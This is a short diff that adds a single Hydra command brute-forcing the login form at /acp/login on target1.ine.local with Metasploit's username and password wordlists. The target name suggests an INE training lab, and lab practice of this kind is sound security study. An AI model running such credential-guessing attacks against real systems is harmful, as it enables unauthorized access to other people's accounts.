@@ -1,0 +1,2 @@
+`hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target1.ine.local http-post-form "/acp/login:login_name=^USER^&login_psw=^PASS^:F=Login"
+`
